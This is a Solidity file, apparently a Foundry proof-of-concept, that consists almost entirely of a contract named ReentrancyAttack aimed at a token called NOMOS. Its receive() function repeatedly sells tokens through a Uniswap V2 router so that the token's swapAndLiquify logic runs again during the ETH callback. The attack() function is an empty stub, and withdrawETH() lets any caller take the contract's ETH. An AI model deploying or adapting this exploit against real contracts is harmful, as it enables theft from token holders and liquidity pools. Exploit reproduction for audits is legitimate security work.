// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface NOMOS {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function excludeFromFee(address account) external;
    function uniswapV2Router() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function minimumTokensBeforeSwapAmount() external view returns (uint256);
    function swapAndLiquifyEnabled() external view returns (bool);
}

contract ReentrancyAttack {
    address public target;
    address public router;
    address public pair;
    uint256 public reentrancyCount;
    uint256 public constant MAX_REENTRANCY = 3;

    constructor(address _target) {
        target = _target;
        router = NOMOS(_target).uniswapV2Router();
        pair = NOMOS(_target).uniswapV2Pair();
    }

    receive() external payable {
        reentrancyCount++;

        if (reentrancyCount < MAX_REENTRANCY) {
            // Re-enter swapAndLiquify if possible
            // We need to check if contract has enough tokens
            uint256 contractBalance = NOMOS(target).balanceOf(target);
            uint256 minimumTokens = NOMOS(target).minimumTokensBeforeSwapAmount();

            if (contractBalance >= minimumTokens) {
                // Try to trigger swapAndLiquify again
                // We can't directly call swapAndLiquify as it's private
                // But we can trigger it by selling more tokens

                // Sell a small amount to trigger again
                uint256 sellAmount = 100000 * 10**11; // Small amount

                address[] memory path = new address[](2);
                path[0] = target;
                path[1] = IUniswapV2Router02(router).WETH();

                // Approve if needed
                NOMOS(target).approve(router, type(uint256).max);

                try IUniswapV2Router02(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
                    sellAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                ) {
                    // Success
                } catch {
                    // Ignore errors during reentrancy
                }
            }
        }
    }

    function attack() external {
        // This function can be called to start the attack
        // The actual attack happens in receive() during swap
    }

    function withdrawETH() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

